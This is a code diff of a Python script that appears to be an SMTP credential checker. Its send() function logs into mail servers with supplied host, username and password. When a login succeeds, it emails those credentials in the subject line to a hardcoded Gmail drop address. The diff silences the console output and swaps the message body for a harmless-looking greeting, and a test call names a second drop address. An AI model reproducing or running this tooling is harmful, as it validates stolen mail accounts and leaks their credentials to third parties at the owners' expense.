@@ -195,17 +195,18 @@ def toByte(string):
 		b = bytearray()
 		b.extend(map(ord, string))
 	except Exception as e:
-		print(e)
+		# print(e)
+		pass
 	return b
 
-def send(host,user,passw,email,productId):
+def send(host,user,passw,email,productId,fixed=False):
 		
 	result = 0
 	for j in range(2):
 		connected=False
 		for i in range(3):
 			try:
-				print('[+] Connecting to '+host)
+				# print('[+] Connecting to '+host)
 				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 				s.setblocking(0)
 				s.settimeout(20)
@@ -213,28 +214,29 @@ def send(host,user,passw,email,productId):
 				connected=True
 				break
 			except:
-				print('1')
+				# print('1')
 				pass
 		if connected==False:
-			print("no smtp connection")
+			# print("no smtp connection")
 			break
 		else:
 			try:
-				print('[+] Connected '+host)
+				# print('[+] Connected '+host)
 				rez=s.recv(4000)
 				rez = rez.decode('utf-8')
 				
 				if rez[0:3]!="220":
-					print(host+","+user+","+passw+' | no smtp connection\n')
+					# print(host+","+user+","+passw+' | no smtp connection\n')
 					s.close()
 					break
 
 				
 				s.send(("EHLO "+host+'\r\n').encode('utf-8'))
 				rez=s.recv(4000).decode('utf-8')
+				# print(rez)
 				#print rez
 				if rez[0:3]!="250":
-					print(host+","+user+","+passw+' | can\' reconize smtp\n')
+					# print(host+","+user+","+passw+' | can\' reconize smtp\n')
 					s.close()
 					break
 				s.send("AUTH LOGIN\r\n".encode('utf-8'))
@@ -242,75 +244,86 @@ def send(host,user,passw,email,productId):
 				rez=s.recv(4000).decode('utf-8')
 
 				if rez[0:3]!="334":
-					print(host+","+user+","+passw+' | can\' login\n')
+					# print(host+","+user+","+passw+' | can\' login\n')
 					s.close()
 					break
 				r = base64.b64encode(user.encode('utf-8'))+'\r\n'.encode('utf-8')
 				s.send(r)
 				rez=s.recv(4000).decode('utf-8')
 				if rez[0:3]!="334":
-					print(host+","+user+","+passw+' | can\' login\n')
+					# print(host+","+user+","+passw+' | can\' login\n')
 					s.close()
 					break
 				s.send(base64.b64encode(passw.encode('utf-8'))+'\r\n'.encode('utf-8'))
 				rez=s.recv(4000).decode('utf-8')
-
+				# print(rez)
 				if rez[0:3]=='235' and 'fail' not in rez.lower():
 					#print email
-					print('[+] Logged '+host)
+					# print('[+] Logged '+host)
+					# if fixed:
+					# 	s.send(toByte('MAIL From: '+user+'\r\n'))
+					# else:
 					s.send(toByte('MAIL From: '+email+'\r\n'))
 					rez=s.recv(4000).decode('utf-8')
 					#print rez
 					if rez[0:3]!='250':
-						print(host+","+user+","+passw+' | can\' login\n')
 						s.close()
 						break
+						# if fixed:
+						# print(host+","+user+","+passw+' | can\' login\n')
+						
 					else:
 						s.send(toByte('RCPT TO: '+email+'\r\n'))
 						rez=s.recv(4000).decode('utf-8')
 						if rez[0:3]!='250':
-							print(host+","+user+","+passw+' | can\' login\n')
+							# if fixed:
+								# print(host+","+user+","+passw+' | can\' login\n')
 							s.close()
 							break
 						else:
 							s.send(toByte('DATA\r\n'))
 							rez=s.recv(4000).decode('utf-8')
-							if rez[0:3]=='354':	
-								headers="From: "+email+'\r\n'
-								headers="Subject: [smtp] ,id#"+productId+','+host+','+user+','+passw+'\r\n'								
+							if rez[0:3]=='354':
+								headers="From: "+user+'\r\n'
+								headers+="Subject: [smtp] id#"+productId+","+host+','+user+','+passw+'\r\n'								
 								headers+='To: '+email+'\r\n'
 								headers+='Content-Type: text/plain\r\n'
 								headers+='Content-Transfer-Encoding: 7bit\r\n'
 								headers+='Date: '+formatdate(localtime=True)+'\r\n'
 								headers+='X-Priority: 3\r\n'
 								headers+='X-Library: Indy 9.00.10\r\n\r\n'
-								headers+='Message text\r\n.\r\n'
+								headers+='hey how are you today\r\n.\r\n'
 								#print headers
 								s.send(toByte(headers))
 								rez=s.recv(4000).decode('utf-8')
 								if rez[0:3]=='250':
-									print('[+] Sent '+host)
-									print('[smtp] '+host+','+user+','+passw+'\n')
+									# print('[+] Sent '+host)
+									# if fixed:
+										# print('[fixed smtp] '+host+','+user+','+passw+'\n')
+									# else:
+										# print('[smtp] '+host+','+user+','+passw+'\n')
 									return 1
-								else:
-									print(host+","+user+","+passw+' | not sending\n')
+								# else:
+									# if fixed:
+										# print(host+","+user+","+passw+' | not sending\n')
 								s.send(toByte('QUIT\r\n'))
 								s.close()
 								break
 							else:
-									print(host+","+user+","+passw+' | can\' login\n')
+								# if fixed:
+									# print(host+","+user+","+passw+' | can\' login\n')
 								s.close()
 								break														
 					result = 1
 				else:
-					print(host+","+user+","+passw+' | invalid user/pass \n')
+					# print(host+","+user+","+passw+' | invalid user/pass \n')
 					s.close()
 					break
 			except Exception as e:
-				print(e)
+				# print(e)
 				exception_type, exception_object, exception_traceback = sys.exc_info()
 				line_number = exception_traceback.tb_lineno
-				print(line_number)
+				# print(line_number)
 				pass				
 	return result
 
@@ -386,7 +399,7 @@ if __name__ == "__main__":
 		# result = WebmailCheck(host, user, password,"")
 		# result = sendEmail(host,user, password,"nursultansaudirbaev157@gmail.com", "Product#123", user)
 		# result = checkUnlimited(host,user, password)
-		# result = send(host, user, password, "nursultansaudirbaev157@gmail.com", "123")
+		# result = send(host, user, password, "richarddavidson1210@gmail.com",'22233')
 		print(result)
 		# print(result.isdigit())
 	except Exception as inst:
